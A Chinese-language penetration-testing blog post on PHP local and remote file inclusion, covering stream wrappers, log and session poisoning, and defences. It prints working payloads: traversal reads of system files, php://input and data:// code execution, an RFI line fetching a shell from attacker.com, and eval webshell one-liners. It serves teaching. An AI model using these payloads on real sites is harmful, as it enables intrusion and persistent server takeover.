@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>任意文件包含（LFI / RFI）</title>
+<meta name="keywords" content="任意文件包含（LFI / RFI）, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、概述1.1 什么是文件包含开发者把可复用的函数或代码段写到单个文件里形成”封装”，调用时直接 include，不用重复编写。这种调用文件的过程就叫文件包含。 为了让代码更灵活，被包含文件的路径通常设为变量来动态调用。但如果路径变量能被">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="任意文件包含（LFI / RFI）">
+<meta property="og:description" content="
+一、概述1.1 什么是文件包含开发者把可复用的函数或代码段写到单个文件里形成”封装”，调用时直接 include，不用重复编写。这种调用文件的过程就叫文件包含。 为了让代码更灵活，被包含文件的路径通常设为变量来动态调用。但如果路径变量能被">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">任意文件包含（LFI / RFI）</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2026-06-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-1-什么是文件包含"><a href="#1-1-什么是文件包含" class="headerlink" title="1.1 什么是文件包含"></a>1.1 什么是文件包含</h3><p>开发者把可复用的函数或代码段写到单个文件里形成”封装”，调用时直接 <code>include</code>，不用重复编写。<strong>这种调用文件的过程就叫文件包含。</strong> 为了让代码更灵活，被包含文件的路径通常设为变量来动态调用。但如果路径变量能被客户端控制，就产生了<strong>任意文件包含漏洞</strong>。</p>
+<p>该漏洞在 PHP Web 应用中居多，JSP &#x2F; ASP &#x2F; ASP.NET 中较少。</p>
+<h3 id="1-2-PHP-四个包含语句"><a href="#1-2-PHP-四个包含语句" class="headerlink" title="1.2 PHP 四个包含语句"></a>1.2 PHP 四个包含语句</h3><table>
+<thead>
+<tr>
+<th>语句</th>
+<th>区别</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>include()</code></td>
+<td>多次包含，多次执行；失败产生警告（E_WARNING），脚本继续运行</td>
+</tr>
+<tr>
+<td><code>include_once()</code></td>
+<td>多次包含，只执行一次；失败产生警告，继续运行</td>
+</tr>
+<tr>
+<td><code>require()</code></td>
+<td>多次包含，多次执行；失败产生错误（E_ERROR），脚本终止</td>
+</tr>
+<tr>
+<td><code>require_once()</code></td>
+<td>多次包含，只执行一次；失败产生错误，终止执行</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-关键配置"><a href="#1-3-关键配置" class="headerlink" title="1.3 关键配置"></a>1.3 关键配置</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span>/<span class="literal">Off</span>   <span class="comment">; 是否允许远程打开文件（影响 data:// 等伪协议）</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span>/<span class="literal">Off</span> <span class="comment">; 是否允许远程包含文件（RFI 的总开关）</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><h3 id="2-1-动态包含"><a href="#2-1-动态包含" class="headerlink" title="2.1 动态包含"></a>2.1 动态包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file-include.php</span></span><br><span class="line"><span class="variable">$fp</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>];</span><br><span class="line">@<span class="keyword">include</span> <span class="variable">$fp</span>;</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>?filepath=xxx</code>，服务端直接把参数值当路径 <code>include</code>。</p>
+<h3 id="2-2-本地文件包含（LFI）"><a href="#2-2-本地文件包含（LFI）" class="headerlink" title="2.2 本地文件包含（LFI）"></a>2.2 本地文件包含（LFI）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=../phpinfo.php</span><br><span class="line">?filepath=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-远程文件包含（RFI）"><a href="#2-3-远程文件包含（RFI）" class="headerlink" title="2.3 远程文件包含（RFI）"></a>2.3 远程文件包含（RFI）</h3><p>前提是 <code>allow_url_include = On</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=http:<span class="comment">//attacker.com/shell.txt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-核心特点"><a href="#2-4-核心特点" class="headerlink" title="2.4 核心特点"></a>2.4 核心特点</h3><p>两个让文件包含变得特别危险的特质：</p>
+<ol>
+<li><strong>无视扩展名</strong>——图片马、日志文件、session 文件，不管后缀是什么，<code>include</code> 全当 PHP 执行</li>
+<li><strong>无条件解析 PHP 标签</strong>——只要内容里有 <code>&lt;?php ?&gt;</code>，包含时就触发</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=./shell.jpg     # 图片马照样执行</span><br><span class="line">?filepath=./access.log    # 日志里的PHP代码照样执行</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、PHP-伪协议"><a href="#三、PHP-伪协议" class="headerlink" title="三、PHP 伪协议"></a>三、PHP 伪协议</h2><p>伪协议是 LFI 升级为 RCE 的核心跳板——即使没有文件上传点，也能读源码、执行命令、写 Shell。</p>
+<h3 id="3-1-全协议速查"><a href="#3-1-全协议速查" class="headerlink" title="3.1 全协议速查"></a>3.1 全协议速查</h3><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>格式</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>file://</code></td>
+<td><code>file:///etc/passwd</code></td>
+<td>访问本地文件</td>
+</tr>
+<tr>
+<td><code>http://</code></td>
+<td><code>http://attacker.com/shell.txt</code></td>
+<td>远程包含（RFI）</td>
+</tr>
+<tr>
+<td><code>php://filter</code></td>
+<td><code>php://filter/read=convert.base64-encode/resource=index.php</code></br><code>php://filter/convert.base64-encode/resource=index.php</code></td>
+<td><strong>读 PHP 源码（用得最多）</strong></td>
+</tr>
+<tr>
+<td><code>php://input</code></td>
+<td><code>php://input</code> + POST body</td>
+<td><strong>直接执行 PHP 命令</strong></td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td><code>data://text/plain,&lt;?php phpinfo()?&gt;</code></td>
+<td>数据流直接注入 PHP 代码</td>
+</tr>
+<tr>
+<td><code>phar://</code></td>
+<td><code>phar://upload/test.zip/shell.php</code></td>
+<td>解压 phar&#x2F;zip 并包含</td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td><code>expect://whoami</code></td>
+<td>执行系统命令（需 PECL 扩展）</td>
+</tr>
+<tr>
+<td><code>zip://</code></td>
+<td><code>zip://shell.zip%23shell.php</code></td>
+<td>zip 包内文件包含</td>
+</tr>
+<tr>
+<td><code>zlib://</code></td>
+<td><code>zlib://shell.gz</code></td>
+<td>压缩流</td>
+</tr>
+<tr>
+<td><code>ftp://</code></td>
+<td><code>ftp://user:pass@host/file</code></td>
+<td>FTP 访问</td>
+</tr>
+<tr>
+<td><code>glob://</code></td>
+<td><code>glob:///var/www/*.php</code></td>
+<td>匹配路径模式</td>
+</tr>
+<tr>
+<td><code>rar://</code></td>
+<td><code>rar://shell.rar%23shell.php</code></td>
+<td>RAR 压缩包</td>
+</tr>
+</tbody></table>
+<p>参考：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP 伪协议总结</a></p>
+<h3 id="3-2-三个核心伪协议"><a href="#3-2-三个核心伪协议" class="headerlink" title="3.2 三个核心伪协议"></a>3.2 三个核心伪协议</h3><p><strong>php:&#x2F;&#x2F;filter — 读源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filepath=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">?filepath=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"><span class="comment"># 返回 base64 编码的源码，解码即得</span></span><br></pre></td></tr></table></figure>
+
+<p>最常用的场景——读配置文件、读数据库密码、读代码逻辑找下一个突破口。</p>
+<p><strong>php:&#x2F;&#x2F;input — 执行 PHP 命令：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/include.php?filepath=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>POST body 里的 PHP 代码直接被 <code>include</code> 执行。无需文件上传，无需 RFI 开启（但需要 <code>allow_url_include=On</code>）。</p>
+<p><strong>data:&#x2F;&#x2F; — 直接注入：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=data:<span class="comment">//text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line">?filepath=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span><br></pre></td></tr></table></figure>
+
+<p>不需要 <code>allow_url_include=On</code>，只需要 <code>allow_url_fopen=On</code>。base64 版可绕过关键字过滤。</p>
+<hr>
+<h2 id="四、利用方法"><a href="#四、利用方法" class="headerlink" title="四、利用方法"></a>四、利用方法</h2><h3 id="4-1-配合文件上传-—-图片马"><a href="#4-1-配合文件上传-—-图片马" class="headerlink" title="4.1 配合文件上传 — 图片马"></a>4.1 配合文件上传 — 图片马</h3><p>上传带 PHP 代码的图片，通过文件包含触发：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=./upload/shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/include.php?filepath=shell.jpg</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-读取敏感文件"><a href="#4-2-读取敏感文件" class="headerlink" title="4.2 读取敏感文件"></a>4.2 读取敏感文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相对路径</span></span><br><span class="line">?filepath=../../../../windows/system32/drivers/etc/hosts</span><br><span class="line"><span class="comment"># 绝对路径</span></span><br><span class="line">?filepath=c:/windows/system32/drivers/etc/hosts</span><br><span class="line"><span class="comment"># 伪协议</span></span><br><span class="line">?filepath=file:<span class="comment">//c:/windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
+
+<p>前提：知道路径 + 有可读权限。</p>
+<h3 id="4-3-日志写入-Getshell"><a href="#4-3-日志写入-Getshell" class="headerlink" title="4.3 日志写入 Getshell"></a>4.3 日志写入 Getshell</h3><p>Apache &#x2F; Nginx 的访问日志会记录 UA 头。把 UA 改成 PHP 一句话，然后包含日志文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 修改 User-Agent 为：</span><br><span class="line">&lt;?php @eval($_REQUEST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"># 然后包含：</span><br><span class="line">?filepath=/var/log/apache2/access.log</span><br><span class="line">?filepath=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>同样思路可用于 SSH 日志、邮件日志。</p>
+<h3 id="4-4-Session-文件写入"><a href="#4-4-Session-文件写入" class="headerlink" title="4.4 Session 文件写入"></a>4.4 Session 文件写入</h3><p>PHP Session 文件通常在 <code>/tmp/sess_&lt;session_id&gt;</code>。如果能控制 Session 中的值（如用户名），PHP 代码就被写进 Session 文件，包含即执行。</p>
+<p><a class="simple-lightbox" href="/imgs/file-inclusion/image-20231227135710163.png"><img   src="/images/loading.svg" data-src="/imgs/file-inclusion/image-20231227135710163.png"  alt="Session 文件包含" lazyload></a></p>
+<p><strong>利用 session.upload_progress（无需控制 Session 数据）：</strong></p>
+<p>PHP 会在 Session 文件中记录上传进度，把恶意文件名&#x2F;内容带进去 → 包含 <code>/tmp/sess_xxx</code>。参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/r1kka/p/15848498.html">ctfshow web82</a>。</p>
+<h3 id="4-5-利用-phpinfo-条件竞争"><a href="#4-5-利用-phpinfo-条件竞争" class="headerlink" title="4.5 利用 phpinfo() 条件竞争"></a>4.5 利用 phpinfo() 条件竞争</h3><p><code>phpinfo()</code> 会显示临时文件的随机文件名。PHP 上传产生的临时文件在请求结束后被删除——在它被删之前通过 phpinfo 拿到文件名并包含：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub php&#x2F;inclusion</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">exp.py</a></li>
+<li>靶机：<a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E9%9D%B6%E6%9C%BA/Vulnhub/infovore-1.md">Vulnhub infovore-1</a></li>
+</ul>
+<h3 id="4-6-写新的-Webshell"><a href="#4-6-写新的-Webshell" class="headerlink" title="4.6 写新的 Webshell"></a>4.6 写新的 Webshell</h3><p>如果蚁剑通过图片马连不上，用图片马里的代码写一个干净的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?=@eval($_REQUEST[777]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php @eval($_REQUEST[777])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=./upload/shell.jpg   <span class="comment"># 先包含执行写入</span></span><br><span class="line">http:<span class="comment">//target.com/shell.php     # 再直接连</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、利用链总结"><a href="#五、利用链总结" class="headerlink" title="五、利用链总结"></a>五、利用链总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞确认</span><br><span class="line">  │</span><br><span class="line">  ├── 有上传点 → 上传图片马 → 4.1 包含触发 → Getshell</span><br><span class="line">  │</span><br><span class="line">  ├── 无上传点</span><br><span class="line">  │     ├── 读源码 → 3.2 php://filter → 审计代码找突破</span><br><span class="line">  │     ├── 执行命令 → 3.2 php://input / data://</span><br><span class="line">  │     ├── 日志注入 → 4.3 改 UA → 包含 access.log</span><br><span class="line">  │     ├── Session → 4.4 写 sess 文件 → 包含 /tmp/sess_xxx</span><br><span class="line">  │     └── phpinfo → 4.5 条件竞争 → 包含临时文件</span><br><span class="line">  │</span><br><span class="line">  └── RFI 开启 → 直接远程包含 attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、挖掘"><a href="#六、挖掘" class="headerlink" title="六、挖掘"></a>六、挖掘</h2><p><strong>黑盒：</strong> 观察参数值是否像一个文件名或路径，改了之后页面内容是否跟着变。</p>
+<p><strong>白盒：</strong> 搜索关键函数：<code>include</code>、<code>include_once</code>、<code>require</code>、<code>require_once</code>、<code>file_get_contents</code> → 回溯参数是否可控 → 检查伪协议是否可用于绕过。</p>
+<hr>
+<h2 id="七、防御"><a href="#七、防御" class="headerlink" title="七、防御"></a>七、防御</h2><ul>
+<li>尽量少用动态包含</li>
+<li>严格过滤被包含文件路径，用白名单</li>
+<li><code>allow_url_include = Off</code>（关掉远程包含）</li>
+<li><code>allow_url_fopen = Off</code>（关掉远程文件读取）</li>
+<li>用 <code>open_basedir</code> 限制文件访问范围：</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = c:\phpstudy_2016\www\</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、案例"><a href="#八、案例" class="headerlink" title="八、案例"></a>八、案例</h2><h3 id="CTFShow-78-117-关卡"><a href="#CTFShow-78-117-关卡" class="headerlink" title="CTFShow 78-117 关卡"></a>CTFShow 78-117 关卡</h3><p>从基础 LFI → 伪协议绕过 → 日志注入 → session 包含，逐级加过滤。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62989306/article/details/126838125">参考1</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63917373/article/details/127760408">参考2</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/r1kka/p/15848498.html">web82 session.upload_progress</a></li>
+</ul>
+<h3 id="Metinfo-5-0-4"><a href="#Metinfo-5-0-4" class="headerlink" title="Metinfo 5.0.4"></a>Metinfo 5.0.4</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/134221624">https://blog.csdn.net/ZhaoSong_&#x2F;article&#x2F;details&#x2F;134221624</a></p>
+<h3 id="熊海-XHCMS-—-代码审计-日志绕过"><a href="#熊海-XHCMS-—-代码审计-日志绕过" class="headerlink" title="熊海 XHCMS — 代码审计 &amp; 日志绕过"></a>熊海 XHCMS — 代码审计 &amp; 日志绕过</h3><p>审计流程：搜索函数定位包含点 → 发现固定目录及后缀名需绕过 → CMS 无上传点 → 日志包含 → 长度绕过后缀限制（PHP 低版本可行）</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45663905/article/details/108148898">参考</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>核心</strong>：文件包含本身不是终点，是一扇门。伪协议读源码 → 代码审计找上传&#x2F;注入 → 日志写马 → Getshell，每一步靠”包含”这把钥匙。</p>
+</blockquote>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="top-box-text">一、概述</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="top-box-text">1.1 什么是文件包含</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-2-PHP-%E5%9B%9B%E4%B8%AA%E5%8C%85%E5%90%AB%E8%AF%AD%E5%8F%A5"><span class="top-box-text">1.2 PHP 四个包含语句</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-3-%E5%85%B3%E9%94%AE%E9%85%8D%E7%BD%AE"><span class="top-box-text">1.3 关键配置</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="top-box-text">二、漏洞原理</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-1-%E5%8A%A8%E6%80%81%E5%8C%85%E5%90%AB"><span class="top-box-text">2.1 动态包含</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-2-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="top-box-text">2.2 本地文件包含（LFI）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-3-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="top-box-text">2.3 远程文件包含（RFI）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-4-%E6%A0%B8%E5%BF%83%E7%89%B9%E7%82%B9"><span class="top-box-text">2.4 核心特点</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="top-box-text">三、PHP 伪协议</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-1-%E5%85%A8%E5%8D%8F%E8%AE%AE%E9%80%9F%E6%9F%A5"><span class="top-box-text">3.1 全协议速查</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-2-%E4%B8%89%E4%B8%AA%E6%A0%B8%E5%BF%83%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="top-box-text">3.2 三个核心伪协议</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="top-box-text">四、利用方法</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-1-%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E2%80%94-%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="top-box-text">4.1 配合文件上传 — 图片马</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-2-%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="top-box-text">4.2 读取敏感文件</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-3-%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5-Getshell"><span class="top-box-text">4.3 日志写入 Getshell</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-4-Session-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="top-box-text">4.4 Session 文件写入</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-5-%E5%88%A9%E7%94%A8-phpinfo-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="top-box-text">4.5 利用 phpinfo() 条件竞争</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-6-%E5%86%99%E6%96%B0%E7%9A%84-Webshell"><span class="top-box-text">4.6 写新的 Webshell</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="top-box-text">五、利用链总结</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81%E6%8C%96%E6%8E%98"><span class="top-box-text">六、挖掘</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1"><span class="top-box-text">七、防御</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AB%E3%80%81%E6%A1%88%E4%BE%8B"><span class="top-box-text">八、案例</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#CTFShow-78-117-%E5%85%B3%E5%8D%A1"><span class="top-box-text">CTFShow 78-117 关卡</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Metinfo-5-0-4"><span class="top-box-text">Metinfo 5.0.4</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E7%86%8A%E6%B5%B7-XHCMS-%E2%80%94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%97%A5%E5%BF%97%E7%BB%95%E8%BF%87"><span class="top-box-text">熊海 XHCMS — 代码审计 &amp; 日志绕过</span></a></li></ol></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2026/06/28/file-upload/">
+          <h3 class="post-title">
+            
+            下一篇：任意文件上传
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
